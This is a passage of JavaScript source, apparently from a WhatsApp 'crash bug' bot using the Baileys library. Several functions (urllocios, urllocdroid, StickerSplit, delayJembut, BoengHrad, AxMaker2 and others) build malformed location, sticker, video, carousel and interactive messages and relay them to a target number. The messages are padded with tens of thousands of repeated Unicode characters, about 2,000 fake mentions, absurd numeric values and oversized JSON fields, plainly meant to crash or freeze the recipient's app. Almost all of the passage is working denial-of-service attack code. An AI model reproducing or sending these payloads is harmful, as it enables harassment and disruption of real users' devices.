          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
        thumbnail: null,
        merchantUrl: `https://whatsapp.${"𑇂𑆵𑆴𑆿".repeat(15000)}.com`
      }
    }
  });
}

async function urllocios(target) { 
  const trigger = "𑇂𑆵𑆴𑆿".repeat(12000);
  const urlCrash = `https://${trigger}.crash.whatsapp-ios.pnx.com/${trigger}/${trigger}/${trigger}/`;
  await sock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 99999e99999,
        degreesLongitude: -99999e99999,
        name: "‼️⃟ ༚ ./𝕾𝖈𝖆𝖗𝖗𝖞𝕯𝖊𝖆𝖙𝖍.   " + trigger,
        inviteLinkGroupTypeV2: "DEFAULT",
        merchantUrl: urlCrash,
        url: urlCrash,
        thumbnailUrl: urlCrash,
        waWebSocketUrl: urlCrash,
        mediaUrl: urlCrash,
        sourceUrl: urlCrash,
        originalImageUrl: urlCrash,
        clickToWhatsappCall: true,
        contextInfo: {
          remoteJid: `${"@s.whatsapp.net"}`,
          participant: "13135550002@s.whatsapp.net",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: trigger,
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              caption: "‼️⃟ ༚ ./𝐒𝐜𝐚𝐫𝐫𝐲𝐃𝐞𝐚𝐭𝐡.   " + trigger,
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          },
          mentionedJid: [
            target,
            "0@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
            ...Array.from(
            { length: 1990 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
              ],
          stanzaId: sock.generateMessageTag(),
          virtexId: sock.generateMessageTag(),
          quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e+21 * 999999999999999999999999999999999999999999999999999999999e+21 * Date.now()
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
};

async function urllocdroid(target) { 
  const trigger = "ꦾ".repeat(61111);
  const urlCrash = `https://${trigger}.crash.whatsapp-android.pnx.com/${trigger}/${trigger}/${trigger}/`;
  await sock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 99999e99999,
        degreesLongitude: -99999e99999,
        name: "‼️⃟ ༚ ./𝕾𝖈𝖆𝖗𝖗𝖞𝕯𝖊𝖆𝖙𝖍.   " + trigger,
        inviteLinkGroupTypeV2: "DEFAULT",
        merchantUrl: urlCrash,
        url: urlCrash,
        thumbnailUrl: urlCrash,
        waWebSocketUrl: urlCrash,
        mediaUrl: urlCrash,
        sourceUrl: urlCrash,
        originalImageUrl: urlCrash,
        clickToWhatsappCall: true,
        contextInfo: {
          remoteJid: `${"@s.whatsapp.net"}`,
          participant: "13135550002@s.whatsapp.net",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: trigger,
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              caption: "‼️⃟ ༚ ./𝕾𝖈𝖆𝖗𝖗𝖞𝕯𝖊𝖆𝖙𝖍.   " + trigger,
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          },
          mentionedJid: [
            target,
            "0@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
            ...Array.from(
            { length: 1990 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
              ],
          stanzaId: sock.generateMessageTag(),
          virtexId: sock.generateMessageTag(),
          quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e+21 * 999999999999999999999999999999999999999999999999999999999e+21 * Date.now()
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
};

async function StickerSplit(target) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, stickerPayload, {});

  if (Math.random() > 0.5) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } else {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  }
}

async function jembutLebat(target) {
  try {
    const n = await sock.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "scarry death v19 gen 2" + "ꦾ".repeat(20000),
          matchedText: "ꦾ".repeat(20000),
          description: "Its Me Raraa",
          title: "ꦾ".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: null,
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1950 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "13135550002@newsletter",
                newsletterName: "its me raraa" + "ꦾ".repeat(10000),
                caption: "scarry death v19 gen 2" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:"born2kill" +  "⃝꙰꙰꙰".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      },
      { participant: { jid: target } }
    );

    await sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: n
      }
    });

    console.log(chalk.bold.red("[ ✓ ] delay to : " + target));
  } catch (err) {
    console.error("error:", err);
    throw new Error(err.message);
  }
}

async function delayJembut(target) {
    const generateMentions = (count) =>
        ["0@s.whatsapp.net", ...Array.from({ length: count }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)];
    const conec = {
        mentionedJid: generateMentions(1999),
        remoteJid: "X",
        participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
        stanzaId: "123",
        groupMentions: [],
        entryPointConversionSource: "non_contact",
        entryPointConversionApp: "whatsapp",
        entryPointConversionDelaySeconds: 467593,
        quotedMessage: {
            paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
            },
            contextInfo: {
                mentionedJid: generateMentions(1999),
                forwardedAiBotMessageInfo: {
                    botName: "META AI",
                    botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
                    creatorName: "Bot"
                }
            }
        }
    };
    const _message = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/546086883_1310911380441126_5082966483951370034_n.enc?ccb=11-4&oh=01_Q5Aa2gF_HT84ah4-RLX9vomG5JWv2ix4n20ceNsWSSB3oY3IXQ&oe=68EE6ADC&_nc_sid=5e03e0&mms3=true",
                    directPath: "/v/t62.7161-24/546086883_1310911380441126_5082966483951370034_n.enc?ccb=11-4&oh=01_Q5Aa2gF_HT84ah4-RLX9vomG5JWv2ix4n20ceNsWSSB3oY3IXQ&oe=68EE6ADC&_nc_sid=5e03e0",
                    mimetype: "video/mp4",
                    mediaKey: "2gYtxD032YCb864uM6DXGY0VFHD/MrXgOg3fH5lX7tI=",
                    fileEncSha256: "mUyFOMui5H4UwoNyDgNL86x0f4VhkyCLTF9bBdZHz5M=",
                    fileSha256: "3LY6/cJaEw8gb2DFQNxiK3EtE9gxJbfE/Kqe6COC9G4=",
                    fileLength: "100000000",
                    mediaKeyTimestamp: "1757865421",
                    caption: "á¥¬à¾á­".repeat(70000),
                    contextInfo: conec
                }
            }
        }
    };
    const message = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQMD_1CEOKH4tHVzDOlXEmXMV-U43qCs3y7D9xfj89CBrOoK7Ef1iQjAYj5SJM9xyMr0HYNGbgZ7I6PKER-4E6vrS5gijKlv6a87SDFzbQ?ccb=9-4&oh=01_Q5Aa2gF39FtaAX5JUJcKWssGQ7rYF84FcMVQtdkoaRkf3qr3Hw&oe=68EE6493&_nc_sid=e6ed6c&mms3=true",
                    directPath: "/o1/v/t24/f2/m234/AQMD_1CEOKH4tHVzDOlXEmXMV-U43qCs3y7D9xfj89CBrOoK7Ef1iQjAYj5SJM9xyMr0HYNGbgZ7I6PKER-4E6vrS5gijKlv6a87SDFzbQ?ccb=9-4&oh=01_Q5Aa2gF39FtaAX5JUJcKWssGQ7rYF84FcMVQtdkoaRkf3qr3Hw&oe=68EE6493&_nc_sid=e6ed6c",
                    mimetype: "image/webp",
                    mediaKey: "xb9yJJkzG3ZjgF5s8qArFEqy3KIOM4uoANdpquU4fAQ=",
                    fileEncSha256: "zmAm4f6CM3g0UymbAj+eYYIfnlVROjZlKzTMElvQ22U=",
                    fileSha256: "NIua8la2CuK8uhkzt8yhIhl/uX9EExtLonR5sX1DvkU=",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 9999999,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    packInfo: {
                        name: "á¥¬à¾á­".repeat(70000),
                        publisher: "á¥¬à¾á­".repeat(40000)
                    },
                    contextInfo: conec
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, message, {});
    const _msg = generateWAMessageFromContent(target, _message, {});
    try {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target } }]
                        }
                    ]
                }
            ]
        });
        await sock.relayMessage("status@broadcast", _msg.message, {
            messageId: _msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target } }]
                        }
                    ]
                }
            ]
        });
    } catch (e) {
        await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id,
            participant: { jid: target }
        });
        await sock.relayMessage(target, _msg.message, {
            messageId: _msg.key.id,
            participant: { jid: target }
        });
    }
}

async function BoengHrad(target) {
  try {
    const x = {
      participant: target,
      remoteJid: "status@broadcast",
      mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
      forwardingScore: 909,
      isForwarded: true,
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: 3,
          expiryTimestamp: Date.now() + 1814400000
        }
      }
    };
    const vidxx = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/530108078_1300455555089909_7256875289226689607_n.enc?ccb=11-4&oh=01_Q5Aa2gFANwGICe3SkdMT914N6NMqZDxAU6y_Ivns3DtjbWtHIA&oe=68F069FC&_nc_sid=5e03e0&mms3=true",
      directPath: "/v/t62.7161-24/530108078_1300455555089909_7256875289226689607_n.enc?ccb=11-4&oh=01_Q5Aa2gFANwGICe3SkdMT914N6NMqZDxAU6y_Ivns3DtjbWtHIA&oe=68F069FC&_nc_sid=5e03e0",
      mimetype: "video/mp4",
      mediaKey: "zcAGLgOo9vGSrdRHW7Dbg3p/VF4WgLcCDp+JrtDWpwA=",
      fileEncSha256: "TrppE9xTh9zzZ8kwjA6L7wSr+9GXNJdWZwX8AAyJduU=",
      fileSha256: "aNdek5pCRZD1xoIve/JBpbJD4QmTZY5o87HxbpHf8M4=",
      fileLength: { low: 100, high: 1000, unsigned: true },
      mediaKeyTimestamp: "1758003935",
      jpegThumbnail: "/9j/2wBDAA4KCw0LCQ4NDA0QDw4RFiQXFhQUFiwgIRokNC43NjMuMjI6QVNGOj1OPjIySGJJTlZYXV5dOEVmbWVabFNbXVn/2wBDAQ8QEBYTFioXFypZOzI7WVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVn/wAARCAAyADIDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAIBAwQFBv/EAC0QAAEEAQIEBAUFAAAAAAAAAAEAAgMRIRIxBBNBUSJCYXEFMoGRoVJygrHB/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAIBEAAgIBBAMBAAAAAAAAAAAAAAECEQMSFCExBEJRcf/aAAwDAQACEQMRAD8A8wTcunsLUAM1GSvFVEpRQe5w6uKgvZr9ewFqj2HJdsduq8E0jSL3NpmkV1+uEryKskho3ANEoG2oxszcRzIn6g8mN3R3QpmvOMYTzu4d8YbFE9khq62/KVjNIx9QUjkTcpWh9Y7vQl0j9P5Qmb3IcHSHWQBqOT7rXzYoOG5cVFxHkI372sZ0yNJc0OF5BQaZG54Apouh1SJlHV+DAuymr1WeGZjGiTiJq1Cwxv8ASXjfiYjdo4LSGkXzNz7Z2RZnuIJGyWMxQOmfTQ0YDjVqgPD2se0+F4XJaeJ4kPAMknmcLv6rrMjLIIo7FgZQGPI8jfBFH0Qp5Z6oQaaX8KRKWEO8Tw7sNloBFenUKtlcpo+XFYOUzBihZI3JQKFowT8AbLoCHA+UnIWjhPh8HKcOKcQ+xWjelp2BLmivumFDYUihbeDdjRiOGIsgiEYO5uyR6lI7S7PQdVAIeTd1dUhwJdQ7YCZqklGorgiu2qv3IVYlcQL1WhIjXEp4UkxCzeSt/lQhAeP0VdAmAouAxhCEyl2QN2eyiTf+J/xCEC9Wc4udZ8R+6EIUnGf/2Q==",
      scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
      scanLengths: [10000, 30000, 40000]
    };
    const msg = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              carouselMessage: {
                cards: Array(20).fill().map(() => ({
                  header: {
                    title: "áá".repeat(8000),
                    videoMessage: vidxx,
                    hasMediaAttachment: true
                  },
                  body: { text: "áá".repeat(8000) },
                  contextInfo: x,
                  nativeFlowMessage: {
                    messageParamsJson: "{}".repeat(10000),
                    buttons: [
                         {
                           name: "single_select",
                           buttonParamsJson: JSON.stringify({
                               title: "its me icha"
                           })
                         }
                       ]
                     }
                   }
                ))
              },
              body: { text: "áá".repeat(8000) },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000)
              },
              contextInfo: x
            }
          }
        }
      }),
      {}
    );
 await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }
        ]
      }
    ]
  });
  } catch (err) {
    console.error(err);
    throw new Error(err.message);
  }
}

async function AxMaker2(target) {
  const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 99999999,
         expectedVideoCount: 0, 
      }
   }, {});
  
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " #Scarrydeath€xe ", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "menu_options", 
            paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #Scarrydeath€xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: " ".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

  const msg3 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 999999,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        },
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }
  };

  const msg4 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(60000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "support@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ],
               messageAssociation: {
                 associationType: 1,
                 parentMessageKey: album.key
               }
             }
           }
         };

    let msg5 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " #Scarrydeath€xe ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@raraaimup • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            statusAttributionType: "SHARED_FROM_MENTION",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              ),
            ]
          }
        }
      }
    }
  }, {});
  
  const msg6 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(60000),
      publisher: "ꦾ".repeat(60000),
      caption: " ### ",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        }
      ],
      fileLength: "999999999",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
       remoteJid: "X",
       participant: "0@s.whatsapp.net",
       stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "0@s.whatsapp.net",
             ...Array.from({ length: 1990 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "support@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         },
      },
    },
  }, {});

  for (const msg of [album, msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
